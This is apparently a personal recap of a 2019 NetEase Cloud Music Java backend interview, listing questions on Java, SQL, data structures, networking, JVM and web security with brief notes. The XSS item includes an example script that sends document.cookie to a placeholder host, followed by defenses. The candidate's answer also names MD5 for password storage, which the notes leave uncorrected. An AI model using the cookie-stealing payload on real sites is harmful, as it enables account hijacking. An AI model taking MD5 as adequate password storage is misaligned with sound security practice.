### 2019.8.15 网易云音乐 一面

48min 

OS：问的范围很广

1. 平时工作中使用的jdk版本（1.7和1.8）

2. 默认的是修饰符 defult ，访问权限

     |           | 同一个类 | 同一个包 | 不同包的子类 | 不同包的非子类 |
     | --------- | -------- | -------- | ------------ | -------------- |
     | private   | 可以     |          |              |                |
     | public    | 可以     | 可以     | 可以         | 可以           |
     | protected | 可以     | 可以     | 可以         |                |
     | default   | 可以     | 可以     |              |                |

3. ClassNotFound 遇到过吗？为什么？

     * 原因：类名写错、加载路径写错

4. RuntimeException 与一般异常的区别

     * 运行时异常：由java虚拟机抛出的异常。用户不必处理。运行时异常表示虚拟机的通常操作中可能遇到的异常，是一种常见运行错误。java编译器要求方法必须声明抛出可能发生的非运行时异常，但是并不要求必须声明抛出未被捕获的运行时异常。
     * 如 ArithmeticException, ConcurrentModificationException, IllegalArgumentException, IndexOutOfBoundsException, NullPointerException, 
     * 一般异常是用户可以抛出的异常，如果抛出调用必须进行处理。

5. 平时用的什么数据库？

6. sql语句，具体执行过程

     * 解析语句，判断是否有高速缓存，有则直接返回
     * 检查 SQL 语句的合法性，是否符合语法规则
     * 检查 SQL 语句的语义是否正确，如表名、字段
     * 获取对象锁
     * 访问权限核对
     * 优化 SQL 语句执行，并放入高速缓存中
     * 提取数据

7. 一个数据表，有五个字段（id,cardId,name,sex,age），如何建立索引？

8. 索引的底层结构（现在想一想可能会要讲一讲B+树索引）

9. 非关系型数据库了解吗？和关系型数据库的区别？
     什么时候用非关系型数据库？

10. 数据结构哪些比较熟？（回答熟悉 链表和树，图不太熟悉，结果面试官就问好多图）

11. ArrayList 和 LinkedList 区别，平时项目中用哪一个更多，具体场景？

12. 如何计算一棵树的高度？递归结束条件是什么？

13. 如何判断一个图是连通图？

14. 拓扑排序使用场景？具体思路？

15. HTTP 报文内容

16. TCP 建立连接过程

17. JVM 中堆和栈的区别？反射得到的类放在哪里？（应该是方法区）方法区会发生GC吗？（回收无用的类和常量） 项目中有遇到过方法区GC吗？

18. 线程池的初始化

19. CPU的 load （不会，Linux）

20. JSP 写过吗？

21. XSS（跨站脚本攻击）说了不知道，讲了知道的 SQL注入攻击

        * 跨站脚本攻击（Cross-Site Scripting, XSS），可以将代码注入到用户浏览的网页上，这种代码包括 HTML 和 JavaScript。

          * 供给与案例

          例如有一个论坛网站，攻击者可以在上面发布以下内容：

          ```
          <script>location.href="//domain.com/?c=" + document.cookie</script>
          ```

          之后该内容可能会被渲染成以下形式：

          ```
          <p><script>location.href="//domain.com/?c=" + document.cookie</script></p>
          ```

          另一个用户浏览了含有这个内容的页面将会跳转到 domain.com 并携带了当前作用域的 Cookie。如果这个论坛网站通过 Cookie 管理用户登录状态，那么攻击者就可以通过这个 Cookie 登录被攻击者的账号了。

          * 危害
            * 窃取用户的 Cookie
            * 伪造虚假的输入表单骗取个人信息
            * 显示伪造的文章或者图片

          * 防范手段

           1. 设置 Cookie 为 HttpOnly

          设置了 HttpOnly 的 Cookie 可以防止 JavaScript 脚本调用，就无法通过 document.cookie 获取用户 Cookie 信息。

           2. 过滤特殊字符

          例如将 `<` 转义为 `&lt;`，将 `>` 转义为 `&gt;`，从而避免 HTML 和 Jascript 代码的运行。

          富文本编辑器允许用户输入 HTML 代码，就不能简单地将 `<` 等字符进行过滤了，极大地提高了 XSS 攻击的可能性。

          富文本编辑器通常采用 XSS filter 来防范 XSS 攻击，通过定义一些标签白名单或者黑名单，从而不允许有攻击性的 HTML 代码的输入。

      * 跨站请求伪造（Cross-site request forgery，CSRF），是攻击者通过一些技术手段欺骗用户的浏览器去访问一个自己曾经认证过的网站并执行一些操作（如发邮件，发消息，甚至财产操作如转账和购买商品）。由于浏览器曾经认证过，所以被访问的网站会认为是真正的用户操作而去执行。

        XSS 利用的是用户对指定网站的信任，CSRF 利用的是网站对用户浏览器的信任。

        * 防范手段
          1. 检查 Referer 首部字段
          2. 添加校验 Token
          3.  输入验证码

      * SQL 注入攻击

        * 防范手段
          1. 使用参数化查询

22. 场景题：怎么存储用户的id和password？加密方法有哪些？（说了MD5）

23. 中间件了解哪些？讲讲 zookeeper 的选举机制，zookeeper 的存储结构？

24. 讲讲定时任务系统怎么做的，说了Eureka 注册中心

25. 有什么问题想问的？